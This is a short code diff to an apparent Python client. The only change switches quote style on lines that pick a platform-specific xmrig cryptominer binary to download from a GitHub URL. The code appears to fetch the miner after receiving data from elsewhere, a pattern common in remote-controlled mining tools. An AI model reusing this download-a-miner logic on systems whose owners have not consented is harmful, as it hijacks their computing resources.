@@ -123,10 +123,10 @@ def client():
                 print(f"\033[31m! {data} !\033[0m")
 
                 if sys.platform == "linux":
-                    url = 'https://github.com/rxyzqc/SC/raw/main/xmrig'
+                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
                     rig = "xmrig"
                 else:
-                    url = 'https://github.com/rxyzqc/SC/raw/main/xmrig.exe'
+                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig.exe"
                     rig = "xmrig.exe"
 
                 if not os.path.exists(rig):
